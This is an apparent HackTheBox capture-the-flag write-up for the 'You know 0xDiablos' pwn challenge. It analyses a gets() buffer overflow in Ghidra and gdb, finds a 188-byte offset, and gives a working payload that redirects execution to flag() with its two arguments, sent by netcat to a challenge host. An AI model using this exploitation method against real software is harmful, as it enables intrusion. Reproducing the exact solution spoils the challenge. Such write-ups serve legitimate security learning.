---
Platform: HackTheBox
Category: Pwn
Difficulty: Easy
Status: Rooted/Finished
Type: Challenge
Title: You know 0xDiablos
tags: 
CreatedOn: 04-12-2023
---
# You know 0xDiablos

**Link to the Challenge:** [https://app.hackthebox.com/challenges/106](https://app.hackthebox.com/challenges/106)

First download the given file.

The give file is a zip file. Extract the zip file using the following command and the given password:

Command: `7z <zip_file>`

[ Check this to install `7z`: [https://www.digitalocean.com/community/tutorials/install-7zip-ubuntu](https://www.digitalocean.com/community/tutorials/install-7zip-ubuntu) ]

password: `hackthebox`

  

We have got a file name `vuln` in the zip. I tried the `file` command on the `vuln` file to identify its type.

![Untitled.png](You%20know%200xDiablos/assets/Untitled.png)

It is an ELF executable file.

Next I ran the Executable. First give the `vuln` file executable permissions using the command `chmod +x vuln` and then run the file.

![Untitled 1.png](You%20know%200xDiablos/assets/Untitled%201.png)

The executable is asking for some string, which we have to find to get the flag.

I tried `strings` on the `vuln` file.

![Untitled 2.png](You%20know%200xDiablos/assets/Untitled%202.png)

And found a file named `flag.txt` , which we will get access if we enter the correct string.

Next I opened the executable in `Ghidra`.

I found the following functions under the functions drop down in symbol tree tab.

![Untitled 3.png](You%20know%200xDiablos/assets/Untitled%203.png)

> [!important]  
> Note: If you weren’t able to locate the functions drop down, do this to see a list of all the functions: Got to the Windows menu in the tool bar and press Functions. You will see a tab opened like this:![Untitled 4.png](You%20know%200xDiablos/assets/Untitled%204.png)  

  

I first took a look at the main function. To view the decompiled version of the main function, double click on the function name in the Functions tab and then switch to the `Decompile` tab.

![Untitled 5.png](You%20know%200xDiablos/assets/Untitled%205.png)

The main function prints out the string “`You know who are 0xDiablos:` ” and it calls another function `vuln()`.

Now to take a look at the `vuln()` function, double click on it. You can now see the `vuln` function displayed.

![Untitled 6.png](You%20know%200xDiablos/assets/Untitled%206.png)

The `vuln` function first declares a variable `local_bc` of type `char` and of size 180 bytes. Next it gets the input from the user and stores it in the `local_bc` variable using the `gets()` method and it also prints out the `local_bc` variable using `puts()` method.

The `local_bc` is the place where the string that we give as a input in the program stores and printed out.

The `vuln()` function uses the `gets()`method to get the input. The `gets()` method is vulnerable to buffer overflow attack, as it doesn’t take in a size argument i.e., the `gets()` method doesn’t has a limit size for the input, which on getting a input of larger size than the size of the variable to which the value is stored, in this case the `local_bc` variable with a size (aka buffer) of 180 bytes, the program will crash and throws an segmentation fault error. This is know as a buffer overflow attack.

  

Let’s try to simulate the above mentioned attack process. First I tried by giving an input of 180 characters. It worked flawlessly with no errors:

![Untitled 7.png](You%20know%200xDiablos/assets/Untitled%207.png)

Next I tried by giving an input of 200 characters, which is more than the size of the variable `local_bc`.

![Untitled 8.png](You%20know%200xDiablos/assets/Untitled%208.png)

We can see that the program throws a segmentation fault error.

Now we have made the buffer / size of the variable overflowing with excess data. Next we have to exploit this vulnerability to make the program to do what we want.

Before diving deeper, let’s also take a look at the `flag` function, which is not called at all in any of the above functions that we saw.

![Untitled 9.png](You%20know%200xDiablos/assets/Untitled%209.png)

The flag function gets two parameters. This function on called, opens the flag.txt and prints out the flag to the screen if the parameters match the conditions.

  

So, our task is to perform the buffer overflow attack and call this `flag()` function to get the flag.

## The Attack in detail

Let’s use a debugger to exploit the buffer overflow. In my case I use the `gdb` debugger with `gef` extension. You can use your own favourite debugger.

![Untitled 10.png](You%20know%200xDiablos/assets/Untitled%2010.png)

  

First we can disassemble the main function.

Command: `disas main`

![Untitled 11.png](You%20know%200xDiablos/assets/Untitled%2011.png)

In the main function you can see the call for the `vuln` function. The `vuln` function has a memory address of `0x8049070`.

Next we can disassemble the `vuln` function.

Command: `disas vuln`

![Untitled 12.png](You%20know%200xDiablos/assets/Untitled%2012.png)

> [!important]  
> Check these to know about the assembly instructions: https://cheatography.com/siniansung/cheat-sheets/linux-assembler/, https://trailofbits.github.io/ctf/vulnerabilities/references/X86_Win32_Reverse_Engineering_Cheat_Sheet.pdf, https://www.cs.virginia.edu/~evans/cs216/guides/x86.html  

In the above screenshot, we can see the `vuln` function in assembly language. You can see the declaration of the variable and getting and printing the variable lines.

Detailed breakdown of the variable declaration line:

![Untitled 13.png](You%20know%200xDiablos/assets/Untitled%2013.png)

The size of the variable is in hexadecimal format. To view it in decimal format, print it using python.

![Untitled 14.png](You%20know%200xDiablos/assets/Untitled%2014.png)

You may notice that the size of the variable is `184`, whereas in the program, the size of the declared variable was `180`. It is possible for some extra bits to be allocated during memory allocation, and this is a common behaviour.

  

Now we can try to give excess data as input and run the program in the decompiler.

Command: `run < <(python3 -c 'print("A" * 200)')`

![Untitled 15.png](You%20know%200xDiablos/assets/Untitled%2015.png)

You can see the segmentation error.

You can see the Instruction Pointer ( `eip` ) is overwritten by `0x41414141` , which is the hexadecimal version of string “AAAA”. Instead of these A’s, we have to replace the Instruction pointers value to the memory address of the function `flag()`, so that we could retrieve the flag.

To overwrite the Instruction Pointer, we first need to find the offset. This means we need to determine the number of characters after the first 180 characters that will overwrite the Instruction Pointer.

To accomplish this, we can manually add characters one by one, run the program, and determine the character count at which the instruction pointer is overwritten.

First, we can add `4` characters additional to the `180` characters, a total of `184` characters and check the Instruction Pointer.

Command: `run < <(python3 -c 'print("A" * 180) + "BBBB"')`

Here I have concatenated “BBBB” to the input string after A’s for easy identification of the position. You can use any characters.

![Untitled 16.png](You%20know%200xDiablos/assets/Untitled%2016.png)

You can see that the Instruction Pointer is not yet overwritten.

Now we can add 4 more characters, total of `188` characters and run the program.

Command: `run < <(python3 -c 'print("A" * 180) + "BBBB" + "CCCC"')`

Here I have concatenated “BBBB” and “CCCC” to the input string after A’s for easy identification of the position. You can use any characters.

![Untitled 17.png](You%20know%200xDiablos/assets/Untitled%2017.png)

This time also the Instruction Pointer is not overwritten, but we can see that the Base and Base Pointer is overwritten by characters that we have entered.

Let’s try again by adding 4 more characters, a total of 192 characters and run the program.

Command: `run < <(python3 -c 'print("A" * 180) + "BBBB" + "CCCC" + "DDDD"')`

Here I have concatenated “BBBB” ,“CCCC” and “DDDD” to the input string after A’s for easy identification of the position. You can use any characters.

![Untitled 18.png](You%20know%200xDiablos/assets/Untitled%2018.png)

This time, we got the Instruction Pointer overwritten by the characters “DDDD”. This shows that, after `188` characters, the Instruction Pointer can be overwritten. So the Offset is `188` characters.

  

We have successfully found the offset. Next we have to find the memory address of the `flag` function. To get the address, first we have to disassemble the flag function. The first line of the output is the address of the `flag()` function.

![Untitled 19.png](You%20know%200xDiablos/assets/Untitled%2019.png)

To satisfy the condition and obtain the flag, the address of the parameter values in the flag function must be passed along with the function.

You can find the address of the values by double pressing the value in ghidra. You can also see the address of the values in the disassembled version of flag function.

  

![Untitled 20.png](You%20know%200xDiablos/assets/Untitled%2020.png)

![Untitled 21.png](You%20know%200xDiablos/assets/Untitled%2021.png)

So we have got all the necessary details to generate a input that overwrites the Instruction Pointer with the call for the `flag()` function. Now we can construct the input:

> [!important]  
> Note: We have to provide the memory address values in the input in Little-Endian Format  

|   |   |   |
|---|---|---|
|**Name/Function**|**Memory Address**|**Little Endian Fromat**|
|`flag()`|`0x080491e2`|`\xe2\x91\x04\x08`|
|`param1`|`0xdeadbeef`|`\xef\xbe\xad\xde`|
|`param2`|`0xc0ded00d`|`\x0d\xd0\xde\xc0`|

```

python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08' + b'PADD' + b'\xef\xbe\xad\xde\x0d\xd0\xde\xc0')"
// Here I have used sys.stdout.buffer.write instead of print because 
// we are giving the input in bytes.
// Here I have used b'PADD' to add padding. Make sure to add this
// \x is used to mention that it is hexadecimal
```

![Untitled 22.png](You%20know%200xDiablos/assets/Untitled%2022.png)

We can see that the input that we created is successfully working.

Now save the generated input in a text file.

![Untitled 23.png](You%20know%200xDiablos/assets/Untitled%2023.png)

We can test the generated text file by the following command:

```
cat input.txt - | ./vuln
// Here we are using '-' to pass the input value once we press the enter
// Run the above command and don't forget to press enter
```

![Untitled 24.png](You%20know%200xDiablos/assets/Untitled%2024.png)

We have successfully performed the buffer overflow attack and called the `flag()` function.

  

Now start the machine and try the input in the target web server using `netcat` , using the above method : `cat input.txt - | nc 167.172.61.89 30939`

![Untitled 25.png](You%20know%200xDiablos/assets/Untitled%2025.png)

We have successfully got the flag……

  

Thank You!!!!